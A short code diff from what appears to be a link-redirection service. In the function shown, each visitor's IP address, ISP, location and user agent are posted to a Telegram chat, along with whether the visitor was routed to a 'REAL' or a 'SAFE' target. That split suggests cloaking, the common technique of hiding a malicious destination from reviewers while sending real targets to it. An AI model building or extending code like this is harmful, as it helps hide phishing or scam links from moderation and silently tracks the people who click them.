@@ -280,12 +280,15 @@ async function handleRedirection(user, req, res) {
     }
 
     // 6. Telegram Notification
-    if (process.env.TELEGRAM_BOT_TOKEN) {
+    const botToken = settings.botToken || process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = settings.chatId || process.env.TELEGRAM_CHAT_ID;
+
+    if (botToken && chatId) {
         let message = `🚀 *SaaS Visit!* (User: ${user.name})\n\n`;
         message += `📍 *IP:* ${clientIp}\n🏢 *ISP:* ${data ? data.isp : 'Unknown'}\n🌍 *Location:* ${data ? `${data.city}, ${data.country}` : 'Unknown'}\n💻 *UA:* ${userAgent}\n🎯 *Target:* ${targetUrl === settings.realLink ? 'REAL' : 'SAFE'}`;
         
-        axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: user.telegram,
+        axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            chat_id: chatId,
             text: message,
             parse_mode: 'Markdown'
         }).catch(() => {});
